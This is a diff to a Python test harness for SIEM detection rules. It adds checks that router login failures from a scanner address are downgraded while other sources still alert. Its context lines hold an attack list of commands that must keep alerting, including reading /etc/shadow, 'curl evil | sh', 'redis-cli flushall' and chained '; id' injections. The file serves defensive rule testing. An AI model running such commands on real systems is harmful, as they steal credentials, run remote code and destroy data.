@@ -126,6 +126,26 @@ def scanner(scanner_ip="192.168.70.11"):
     return failures
 
 
+def hap(scanner_ip="192.168.70.11"):
+    """Phase 2c: the scanner's router logins are lowered to L3, other sources keep L5."""
+    line = "2026-10-15T02:05:18.151+13:00 hAP login failure for user karaf from {} via {}"
+    checks = []
+    for name, ip, via, want in [
+        ("router login failure from the scanner", scanner_ip, "ssh", ("100211", 3)),
+        ("router login failure from another address", "203.0.113.5", "ssh", ("2501", 5)),
+        ("router login failure, scanner IP as a substring", "1" + scanner_ip, "ssh", ("2501", 5)),
+        ("router login failure from the scanner over winbox", scanner_ip, "winbox", ("2501", 5)),
+    ]:
+        checks.append((name, logtest(line.format(ip, via), "syslog", "/var/log/syslog"), want))
+    failures = 0
+    for name, got, want in checks:
+        ok = got == want
+        failures += not ok
+        print(f"{'PASS' if ok else 'FAIL'}  {name}: fired {got[0] or 'none'} L{got[1]}, want {want[0]} L{want[1]}")
+    print(f"\n{'ALL PASS' if not failures else str(failures) + ' FAILED'}")
+    return failures
+
+
 ATTACKS = [  # execs that must keep alerting after 1d, including look-alikes of real health checks
     "/bin/bash", "cat /etc/shadow", "/bin/sh -c /usr/bin/healthcheck.sh; curl evil | sh",
     "/bin/sh -c x # /usr/bin/healthcheck.sh", "redis-cli -a pw ping; id", "redis-cli -a pw flushall",
@@ -161,6 +181,8 @@ def suppression(checks_path=None):
 def live(agent, marker, minutes=30, capabilities=()):
     """Tier 2: did the marked live actions on `agent` produce the expected alerts?"""
     spec = json.load(open(os.path.join(HERE, "must_fire_live_cases.json")))
+    if "rootcheck" in capabilities:
+        minutes = 8   # tight window: the "must not alert" check must not see events from before the rules loaded
     where = {"bool": {"should": [
         {"multi_match": {"query": marker, "type": "phrase",
                          "fields": ["full_log", "data.srcuser", "data.dstuser"]}},
@@ -170,6 +192,14 @@ def live(agent, marker, minutes=30, capabilities=()):
     for case in spec["cases"]:
         if not set(case["needs"]) <= set(capabilities):
             print(f"SKIP  {case['name']} (needs {case['needs']})")
+            continue
+        if case.get("absent"):  # must NOT alert: events of these rules mentioning a phrase, since the last scan trigger
+            q = {"bool": {"filter": [{"range": {"@timestamp": {"gte": f"now-{int(minutes)}m"}}}, {"term": {"agent.name": agent}},
+                                     {"terms": {"rule.id": case["ids"]}}, {"match_phrase": {"full_log": case["phrase"]}}]}}
+            n = wt.total(wt.search(wt.ALERTS, q))
+            ok = n == 0
+            failures += not ok
+            print(f"{'PASS' if ok else 'FAIL'}  {case['name']}: {n} alert(s), want none of {case['ids']} mentioning {case['phrase']!r}")
             continue
         q = {"bool": {"filter": [{"range": {"@timestamp": {"gte": f"now-{int(minutes)}m"}}}, {"term": {"agent.name": agent}},
                                  {"terms": {"rule.id": case["ids"]}}, {"range": {"rule.level": {"gte": case["min_level"]}}},
@@ -188,6 +218,8 @@ def live(agent, marker, minutes=30, capabilities=()):
 
 
 if __name__ == "__main__":
+    if sys.argv[1:2] == ["hap"]:
+        sys.exit(1 if hap() else 0)
     if sys.argv[1:2] == ["scanner"]:
         sys.exit(1 if scanner() else 0)
     if sys.argv[1:2] == ["suppression"]:
